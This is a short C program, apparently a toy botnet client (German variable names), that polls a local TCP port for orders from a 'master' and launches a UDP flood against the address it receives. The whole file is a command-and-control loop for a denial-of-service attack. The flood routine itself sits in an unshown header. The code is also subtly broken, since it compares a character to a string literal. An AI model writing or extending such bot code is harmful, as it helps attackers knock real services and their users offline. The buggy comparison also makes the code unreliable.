#include "stdio.h"
#include "eliza.h"
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    while(1) {
        char antwort[65000];
        simpleListenTcp("127.0.0.1", 5003, "t", strlen("t"), antwort);
        if(strcmp(antwort, "Hibot.") == 0) {
            printf("Nothing to do today.\n");
        }
        else if (antwort[0] == "a") {
            printf("I am supposed to shot at %s\n", antwort);
            startUDPFlood(antwort);
        }
        else {
            printf("Strange command from master: %s", antwort);
        }
        sleep(5);
    }
}
